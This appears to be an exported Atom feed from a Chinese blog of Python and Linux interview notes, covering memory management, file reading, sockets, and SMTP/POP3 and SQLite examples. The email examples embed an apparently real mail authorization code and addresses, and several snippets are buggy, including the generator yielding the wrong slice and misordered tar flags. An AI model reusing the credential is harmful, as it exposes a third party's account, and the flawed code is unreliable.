class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">is</span> 通过id判断</span><br><span class="line">== 通过value判断</span><br></pre></td></tr></table></figure><h4 id="谈谈你对面向对象的理解？"><a href="#谈谈你对面向对象的理解？" class="headerlink" title="谈谈你对面向对象的理解？"></a>谈谈你对面向对象的理解？</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">面向对象是相对于面向过程而言的。面向过程语言是一种基于功能分析的、以算法为中心的程序设计方法；</span><br><span class="line">而面向对象是一种基于结构分析的、以数据为中心的程序设计思想。</span><br><span class="line">在面向对象语言中有一个有很重要东西，叫做类。</span><br><span class="line">面向对象有三大特性：封装、继承、多态。</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;单例&quot;&gt;&lt;a href=&quot;#单例&quot; class=&quot;headerlink&quot; title=&quot;单例&quot;&gt;&lt;/a&gt;单例&lt;/h4&gt;&lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span
      
    
    </summary>
    
    
      <category term="Interview" scheme="http://spiderblog.cn/categories/Interview/"/>
    
    
      <category term="Interview" scheme="http://spiderblog.cn/tags/Interview/"/>
    
  </entry>
  
  <entry>
    <title>Interview-3</title>
    <link href="http://spiderblog.cn/Interview-3.html"/>
    <id>http://spiderblog.cn/Interview-3.html</id>
    <published>2020-01-27T15:06:10.000Z</published>
    <updated>2020-01-27T15:51:33.997Z</updated>
    
    <content type="html"><![CDATA[<h3 id="Python-的内存管理机制及调优手段？"><a href="#Python-的内存管理机制及调优手段？" class="headerlink" title="Python 的内存管理机制及调优手段？"></a>Python 的内存管理机制及调优手段？</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 内存管理机制：引用计数、垃圾回收、内存池</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.引用计数</span></span><br><span class="line">当一个 Python 对象被引用时，引用计数加<span class="number">1</span>，</span><br><span class="line">当不再被一个变量，减<span class="number">1</span>，</span><br><span class="line">当引用计数等于<span class="number">0</span>时对象被删除。</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 2.垃圾回收</span></span><br><span class="line"><span class="number">2.1</span> 引用计数</span><br><span class="line">当引用计数为<span class="number">0</span>,则被回收 （对循环引用，失效）</span><br><span class="line"><span class="number">2.2</span> 标记清除 </span><br><span class="line">针对循环引用，先将循环引用摘掉，得出有效计数</span><br><span class="line"><span class="number">2.3</span> 分代回收</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 3. 内存池</span></span><br><span class="line">用于管理对小块内存的申请和释放（小于<span class="number">256</span>字节的，直接在内存池申请内存）</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">调优手段（了解）</span><br><span class="line"><span class="number">1.</span>手动垃圾回收</span><br><span class="line"><span class="number">2.</span>调高垃圾回收阈值</span><br><span class="line"><span class="number">3.</span>避免循环引用（手动解循环引用和使用弱引用）</span><br></pre></td></tr></table></figure><h3 id="内存泄露是什么？如何避免？"><a href="#内存泄露是什么？如何避免？" class="headerlink" title="内存泄露是什么？如何避免？"></a>内存泄露是什么？如何避免？</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 由于设计错误，失去对该段内存的控制，造成内存浪费。</span></span><br><span class="line"><span class="comment"># 有 __del__() 函数的对象间的循环引用是导致内存泄漏的主凶</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 避免</span></span><br><span class="line">不使用一个对象时使用 <span class="keyword">del</span> object 删除一个引用计数</span><br><span class="line">可以通过 sys.getrefcount(obj) 获取对象的引用计数，根据返回值是否为 <span class="number">0</span> 判断是否内存泄漏</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;Python-的内存管理机制及调优手段？&quot;&gt;&lt;a href=&quot;#Python-的内存管理机制及调优手段？&quot; class=&quot;headerlink&quot; title=&quot;Python 的内存管理机制及调优手段？&quot;&gt;&lt;/a&gt;Python 的内存管理机制及调优手段？&lt;/h3&gt;&lt;
      
    
    </summary>
    
    
      <category term="Interview" scheme="http://spiderblog.cn/categories/Interview/"/>
    
    
      <category term="Interview" scheme="http://spiderblog.cn/tags/Interview/"/>
    
  </entry>
  
  <entry>
    <title>Interview-2</title>
    <link href="http://spiderblog.cn/Interview-2.html"/>
    <id>http://spiderblog.cn/Interview-2.html</id>
    <published>2020-01-27T14:28:51.000Z</published>
    <updated>2020-02-04T07:17:41.553Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 日志以文本可以存储在“/var/log/”目录下后缀名为.log</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看服务占用的端口</span></span><br><span class="line">netstat -anp | grep service_name</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">grep 是查找匹配条件的行</span><br><span class="line">find 是搜索匹配条件的文件（找文件）</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Linux 重定向命令有哪些？有什么区别?</span></span><br><span class="line"><span class="number">1.</span> 重定向&gt;   覆盖</span><br><span class="line"><span class="number">2.</span> 重定向&gt;&gt;  追加</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 10 个常用的 Linux 命令</span></span><br><span class="line">pwd 显示工作路径</span><br><span class="line">ls 查看目录中的文件</span><br><span class="line">rm -f file1   <span class="comment"># 删文件 -f 不给提示</span></span><br><span class="line">rmdir dir1    <span class="comment"># 删目录</span></span><br><span class="line">groupadd group_name <span class="comment"># 创建一个新用户组</span></span><br><span class="line">groupdel group_name <span class="comment"># 删除一个用户组</span></span><br><span class="line">tar -cvf archive.tar file1 file2 dir1  <span class="comment"># 创建一个非压缩的 tar包</span></span><br><span class="line">tar -tf archive.tar <span class="comment"># 显示一个包中的内容</span></span><br><span class="line">tar -xvf archive.tar -C /tmp <span class="comment"># 解压压缩包到/tmp目录下</span></span><br><span class="line"><span class="comment"># -c 压缩 -x 解压 -v 显示所有过程 -f 压缩包名字</span></span><br><span class="line">tar -cvfj archive.tar.bz2 dir1  <span class="comment"># 创建一个 bzip2 格式的压缩包</span></span><br><span class="line">tar -xvfj archive.tar.bz2       <span class="comment"># 解压一个 bzip2 格式的压缩包</span></span><br><span class="line">tar -cvfz archive.tar.gz dir1   <span class="comment"># 创建一个 gzip 格式的压缩包</span></span><br><span class="line">tar -xvfz archive.tar.gz        <span class="comment"># 解压一个 gzip 格式的压缩包</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 关机</span></span><br><span class="line">reboot  <span class="comment"># 重启</span></span><br><span class="line">shutdown –r now  <span class="comment"># 重启，会给其他用户提示</span></span><br><span class="line">shutdown -h <span class="number">20</span>:<span class="number">25</span>   <span class="comment">#  定时关机</span></span><br><span class="line">shutdown -h +<span class="number">10</span>  <span class="comment"># 十分钟后关机</span></span><br><span class="line">init <span class="number">0</span>  <span class="comment"># 关机</span></span><br><span class="line">init <span class="number">6</span>  <span class="comment"># 重启</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cl
      
    
    </summary>
    
    
      <category term="Interview" scheme="http://spiderblog.cn/categories/Interview/"/>
    
    
      <category term="Interview" scheme="http://spiderblog.cn/tags/Interview/"/>
    
      <category term="Linux" scheme="http://spiderblog.cn/tags/Linux/"/>
    
  </entry>
  
  <entry>
    <title>File-io</title>
    <link href="http://spiderblog.cn/File-io.html"/>
    <id>http://spiderblog.cn/File-io.html</id>
    <published>2020-01-27T07:15:17.000Z</published>
    <updated>2020-02-04T07:01:36.629Z</updated>
    
    <content type="html"><![CDATA[<h4 id="4G-内存怎么读取一个-5G-的数据？"><a href="#4G-内存怎么读取一个-5G-的数据？" class="headerlink" title="4G 内存怎么读取一个 5G 的数据？"></a>4G 内存怎么读取一个 5G 的数据？</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法一:</span></span><br><span class="line"><span class="comment"># 生成器，分多次读取</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">my_read</span><span class="params">(file, separator)</span>:</span>  <span class="comment"># 流对象，分隔符</span></span><br><span class="line">    buffer = <span class="string">""</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        <span class="keyword">while</span> separator <span class="keyword">in</span> buffer:  <span class="comment"># 此处while比if更合适, 处理buffer有多个separator</span></span><br><span class="line">            pos = buffer.index(separator)  <span class="comment"># 获取第一个下标</span></span><br><span class="line">            <span class="keyword">yield</span> separator[:pos]</span><br><span class="line">            buffer = buffer[pos + len(separator):]</span><br><span class="line">        chunk = file.read(<span class="number">2000</span>)  <span class="comment"># 太小也会降低效率</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> chunk:</span><br><span class="line">            <span class="keyword">yield</span> buffer</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        buffer = buffer + chunk</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> open(<span class="string">'f.txt'</span>, <span class="string">'r'</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> line <span class="keyword">in</span> my_read(f, separator=<span class="string">'\n'</span>):</span><br><span class="line">        print(line)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 方法二:</span></span><br><span class="line"><span class="comment"># linux命令split切割成小文件</span></span><br><span class="line">split -l <span class="number">300</span> big.txt -d -a <span class="number">4</span> big_  <span class="comment"># 系数不是字母而是数字（-d），后缀系数为四位数（-a 4）</span></span><br><span class="line">split -b <span class="number">10</span>m big.txt big_          <span class="comment"># 按照大小切割</span></span><br></pre></td></tr></table></figure><ul><li><a href="https://blog.csdn.net/mxgsgtc/article/details/12048919" target="_blank" rel="external nofollow noopener noreferrer">linux命令split切割成小文件</a></li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h4 id=&quot;4G-内存怎么读取一个-5G-的数据？&quot;&gt;&lt;a href=&quot;#4G-内存怎么读取一个-5G-的数据？&quot; class=&quot;headerlink&quot; title=&quot;4G 内存怎么读取一个 5G 的数据？&quot;&gt;&lt;/a&gt;4G 内存怎么读取一个 5G 的数据？&lt;/h4&gt;&lt;figu
      
    
    </summary>
    
    
      <category term="Interview" scheme="http://spiderblog.cn/categories/Interview/"/>
    
    
      <category term="Interview" scheme="http://spiderblog.cn/tags/Interview/"/>
    
  </entry>
  
  <entry>
    <title>Interview-1</title>
    <link href="http://spiderblog.cn/Interview-1.html"/>
    <id>http://spiderblog.cn/Interview-1.html</id>
    <published>2020-01-21T04:45:14.000Z</published>
    <updated>2020-02-03T15:21:50.806Z</updated>
    
    <content type="html"><![CDATA[<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">修改不可变数据会抛出TypeError异常</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">print</span> 方法默认调用 sys.stdout.write 方法</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 文件路径操作</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">print_directory_contents</span><span class="params">(abs_path)</span>:</span></span><br><span class="line">    <span class="string">"""</span></span><br><span class="line"><span class="string">    :param abs_path: 文件夹绝对地址</span></span><br><span class="line"><span class="string">    :return: 该文件夹中文件路径+包含的文件夹的文件路径</span></span><br><span class="line"><span class="string">    """</span></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">for</span> child_path <span class="keyword">in</span> os.listdir(abs_path):</span><br><span class="line">        abs_child_path = os.path.join(abs_path, child_path)</span><br><span class="line">        <span class="keyword">if</span> os.path.isdir(abs_child_path):</span><br><span class="line">            print_directory_contents(abs_child_path)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(abs_child_path)</span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">os.remove()删除文件</span></span><br><span class="line"><span class="string">os.rename()重命名文件</span></span><br><span class="line"><span class="string">os.walk()生成目录树下的所有文件名</span></span><br><span class="line"><span class="string">os.chdir()改变目录</span></span><br><span class="line"><span class="string">os.mkdir/makedirs 创建目录/多层目录</span></span><br><span class="line"><span class="string">os.rmdir/removedirs 删除目录/多层目录</span></span><br><span class="line"><span class="string">os.listdir()列出指定目录的文件</span></span><br><span class="line"><span class="string">os.getcwd()取得当前工作目录</span></span><br><span class="line"><span class="string">os.chmod()改变目录权限</span></span><br><span class="line"><span class="string">os.path.basename()去掉目录路径，返回文件名</span></span><br><span class="line"><span class="string">os.path.dirname()去掉文件名，返回目录路径</span></span><br><span class="line"><span class="string">os.path.join()将分离的各部分组合成一个路径名</span></span><br><span class="line"><span class="string">os.path.split()返回（dirname(),basename())元组</span></span><br><span class="line"><span class="string">os.path.splitext()(返回 filename,extension)元组</span></span><br><span class="line"><span class="string">os.path.getatime\ctime\mtime 分别返回最近访问、创建、修改时间</span></span><br><span class="line"><span class="string">os.path.getsize()返回文件大小</span></span><br><span class="line"><span class="string">os.path.exists()是否存在</span></span><br><span class="line"><span class="string">os.path.isabs()是否为绝对路径</span></span><br><span class="line"><span class="string">os.path.isdir()是否为目录</span></span><br><span class="line"><span class="string">os.path.isfile()是否为文件</span></span><br><span class="line"><span class="string">'''</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 拷贝</span></span><br><span class="line"><span class="keyword">import</span> copy</span><br><span class="line">copy.deepcopy(a)  <span class="comment"># 深拷贝</span></span><br><span class="line"><span class="comment"># '原子'类型的对象拷贝,都是返回引用,不是新创建</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># random模块</span></span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line">random.random()  <span class="comment"># [0,1) float</span></span><br><span class="line">random.uniform(a, b)  <span class="comment"># [a,b] float</span></span><br><span class="line">random.randint(a, b)  <span class="comment"># [a,b] int</span></span><br><span class="line">random.randrange(a, b, step)  <span class="comment"># [a,b) step为步长，随机一个数字</span></span><br><span class="line">random.choice(sequence)  <span class="comment"># list中随机一个元素</span></span><br><span class="line">random.shuffle(alist)  <span class="comment"># 打乱顺序，无返回值</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># datetime</span></span><br><span class="line"><span class="keyword">import</span> datetime</span><br><span class="line">date1 = datetime.date(year=int(<span class="number">100</span>),month=int(<span class="number">2</span>),day=int(<span class="number">22</span>))</span><br><span class="line">print((date1-date1).days + <span class="number">1</span>)</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># sys模块</span></span><br><span class="line">sys.path 主要是对 Python 解释器的系统环境参数的操作（动态的改变 Python 解释器搜索路径）</span><br><span class="line">sys.argv 命令行参数 List，第一个元素是程序本身代码（即此.py程序）<span class="comment"># 有时候带路径</span></span><br><span class="line">sys.exit(n) 退出程序，正常退出时 exit(<span class="number">0</span>)</span><br><span class="line">sys.maxint 最大的 Int 值</span><br><span class="line">sys.maxunicode 最大的 Unicode 值</span><br><span class="line">sys.stdout 标准输出</span><br><span class="line">sys.stdin 标准输入</span><br><span class="line">sys.stderr 错误输出</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Python 是强语言类型还是弱语言类型?</span></span><br><span class="line">Python 是强类型的动态脚本语言。  <span class="comment"># 强类型</span></span><br><span class="line">强类型：不允许不同类型相加。</span><br><span class="line">动态：不使用显示数据类型声明，且确定一个变量的类型是在第一次给它赋值的时候。</span><br><span class="line">脚本语言：一般也是解释型语言，运行代码只需要一个解释器，不需要编译。</span><br></pre></td></tr></table></figure><p><a href="https://www.woola.net/detail/2016-08-28-python-object-introspection.html" target="_blank" rel="external nofollow noopener noreferrer">Python自省 (introspection)</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># PEP8 规范</span></span><br><span class="line"><span class="comment"># 模块和包:除特殊模块 __init__ 之外，模块名称都使用不带下划线的小写字母。若是它们实现一个协议，那么通常使用lib为后缀</span></span><br><span class="line"><span class="comment"># 使用 has 或 is 前缀命名布尔元素 is_connect = True  has_member = False</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 性能分析</span></span><br><span class="line"><span class="keyword">import</span> cProfile</span><br><span class="line">cProfile.run(<span class="string">'func(agrs)'</span>)   <span class="comment"># 字符串</span></span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;figure class=&quot;highlight python&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span cl
      
    
    </summary>
    
    
      <category term="Interview" scheme="http://spiderblog.cn/categories/Interview/"/>
    
    
      <category term="Interview" scheme="http://spiderblog.cn/tags/Interview/"/>
    
  </entry>
  
  <entry>
    <title>Beethoven-2</title>
    <link href="http://spiderblog.cn/Beethoven-2.html"/>
    <id>http://spiderblog.cn/Beethoven-2.html</id>
    <published>2020-01-18T12:26:30.000Z</published>
    <updated>2020-02-04T08:42:01.613Z</updated>
    
    <content type="html"><![CDATA[<h4 id="socket"><a href="#socket" class="headerlink" title="socket"></a>socket</h4><ul><li>TCP</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># TCP客户端</span></span><br><span class="line"><span class="keyword">import</span> socket</span><br><span class="line">s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">'www.baidu.com'</span>,<span class="number">80</span>))</span><br><span class="line">s.send(bytes)  <span class="comment"># 发送</span></span><br><span class="line">s.recv(<span class="number">1024</span>)  <span class="comment"># 接收bytes,没有数据了，则为空</span></span><br><span class="line">s.close()</span><br><span class="line"><span class="comment"># TCP服务端</span></span><br><span class="line">s.bind((<span class="string">'127.0.0.1'</span>, <span class="number">80</span>))  <span class="comment"># 对外服务绑定0.0.0.0</span></span><br><span class="line">s.listen(<span class="number">5</span>)  <span class="comment"># 等待连接的最大数量</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    <span class="comment"># 接受一个新连接:</span></span><br><span class="line">    sock, addr = s.accept()  <span class="comment"># sock是socket对象,addr是客户端ip地址</span></span><br><span class="line">    <span class="comment"># 创建新线程来处理TCP连接:</span></span><br><span class="line">    t = threading.Thread(target=tcplink, args=(sock, addr))</span><br><span class="line">    t.start()</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">tcplink</span><span class="params">(sock, addr)</span>:</span></span><br><span class="line">    ...</span><br><span class="line">    sock.close()</span><br></pre></td></tr></table></figure><ul><li>UDP</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)</span><br><span class="line">s.bind((<span class="string">'127.0.0.1'</span>, <span class="number">80</span>))</span><br><span class="line">data, addr = s.recvfrom(<span class="number">1024</span>)  <span class="comment"># 接收</span></span><br><span class="line">s.sendto(data, (<span class="string">'127.0.0.1'</span>, <span class="number">80</span>))  <span class="comment"># 发送</span></span><br><span class="line">s.close()</span><br></pre></td></tr></table></figure><h4 id="SMTP发送邮件"><a href="#SMTP发送邮件" class="headerlink" title="SMTP发送邮件"></a>SMTP发送邮件</h4><ul><li>email构建邮件，smtplib发送邮件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> email.header <span class="keyword">import</span> Header</span><br><span class="line"><span class="keyword">from</span> email.mime.text <span class="keyword">import</span> MIMEText</span><br><span class="line"><span class="comment"># 邮件一般是由标题，发信人，收件人，邮件内容，附件等构成</span></span><br><span class="line">msg = MIMEText(<span class="string">'hello,send by python...'</span>, <span class="string">'plain'</span>, <span class="string">'utf-8'</span>)  <span class="comment"># 内容</span></span><br><span class="line">msg[<span class="string">'From'</span>] = Header(<span class="string">'Jason'</span>)  <span class="comment"># 发件人</span></span><br><span class="line">msg[<span class="string">'To'</span>] = Header(<span class="string">'Administrators'</span>)  <span class="comment"># 收件人</span></span><br><span class="line">msg[<span class="string">'Subject'</span>] = Header(<span class="string">'来自SMTP的问候'</span>, <span class="string">'utf-8'</span>)  <span class="comment"># 标题</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> smtplib</span><br><span class="line">server = smtplib.SMTP(<span class="string">"smtp.qq.com"</span>, <span class="number">25</span>)</span><br><span class="line"><span class="comment"># server.set_debuglevel(1)   # 打印详细</span></span><br><span class="line">server.starttls()  <span class="comment"># 加密</span></span><br><span class="line">server.login(<span class="string">"1837722596@qq.com"</span>, <span class="string">"gphfapcvqmjubeje"</span>)  <span class="comment"># 授权码</span></span><br><span class="line">server.sendmail(<span class="string">"1837722596@qq.com"</span>, [<span class="string">"17859717522@163.com"</span>, <span class="string">"923810495@qq.com"</span>], msg.as_string())</span><br><span class="line">server.quit()</span><br></pre></td></tr></table></figure><h4 id="POP3收取邮件"><a href="#POP3收取邮件" class="headerlink" title="POP3收取邮件"></a>POP3收取邮件</h4><ul><li>email解析邮件，poplib下载邮件</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 可以不掌握</span></span><br><span class="line"><span class="keyword">import</span> poplib</span><br><span class="line">server = poplib.POP3(<span class="string">"pop.qq.com"</span>)</span><br><span class="line">server.user(<span class="string">"1837722596@qq.com"</span>)</span><br><span class="line">server.pass_(<span class="string">"gphfapcvqmjubeje"</span>)</span><br><span class="line">server.stat()   <span class="comment"># stat()返回邮件数量和占用空间</span></span><br></pre></td></tr></table></figure><h4 id="使用SQLite"><a href="#使用SQLite" class="headerlink" title="使用SQLite"></a>使用SQLite</h4><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># SQLite是一种嵌入式数据库，它的数据库就是一个文件。</span></span><br><span class="line"><span class="comment"># SQLite本身是C写的,而且体积很小,轻量级、可嵌入</span></span><br><span class="line"><span class="keyword">import</span> sqlite3</span><br><span class="line">conn = sqlite3.connect(<span class="string">'test.db'</span>)</span><br><span class="line">cursor = conn.cursor()</span><br><span class="line">cursor.execute(<span class="string">'sql'</span>)</span><br><span class="line"><span class="comment"># cursor对象存储了执行sql语句的结果</span></span><br><span class="line"><span class="comment"># values = cursor.fetchall()  # 获取查询结果集,是list类型,里面是tuple对应一行记录.</span></span><br><span class="line"><span class="comment"># cursor.rowcount  # 获取受影响的行数 </span></span><br><span class="line">cursor.close()</span><br><span class="line">conn.commit()  <span class="comment"># 提交事务，非常重要</span></span><br><span class="line">conn.close()</span><br><span class="line"><span class="comment"># 参数问题  使用'?'占位符</span></span><br><span class="line">cursor.execute(<span class="string">'select * from user where name=? and pwd=?'</span>, (<span class="string">'abc'</span>, <span class="string">'password'</span>))</span><br></pre></td></tr></table></figure><h4 id="使用MySQL"><a href="#使用MySQL" class="headerlink" title="使用MySQL"></a>使用MySQL</h4><figure class="highlight 